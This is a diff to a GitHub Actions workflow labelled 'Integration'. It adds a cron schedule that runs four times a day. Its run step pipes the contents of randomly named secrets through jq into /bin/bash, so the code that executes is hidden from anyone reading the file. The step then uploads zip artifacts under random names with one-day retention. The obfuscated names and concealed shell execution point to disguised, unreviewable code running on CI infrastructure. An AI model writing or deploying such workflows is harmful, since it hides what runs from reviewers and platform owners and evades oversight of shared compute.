@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '52 5,11,17,23 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,18 +16,15 @@ jobs:
           fetch-depth: 1
       - name: Execute
         env:
-          whpct0495: ${{ secrets.whpct0495 }}
+          ppwpo81: ${{ secrets.ppwpo81 }}
         run: |
-          printf '%s' "$whpct0495" | jq -r .ss90 | /bin/bash
-          echo $kz4695 | jq -r .l440 | /bin/bash
-          printf '%s' "$y525" | jq -r .bymdh30841 | /bin/bash
-          echo $l22 | jq -r .hpti33090 | /bin/bash
-          printf '%s' "$tmz3302" | jq -r .mq14 | /bin/bash
-          printf '%s' "$ece87685" | jq -r .snfrg91 | /bin/bash
+          printf '%s' "$ppwpo81" | jq -r .vo4743 | /bin/bash
+          echo $gpnok189 | jq -r .cgukq1 | /bin/bash
+          echo $evuct23974 | jq -r .vdbl98 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: QiZZtwVS
+          name: pCa5nKnK
           path: "*.zip"
           retention-days: 1
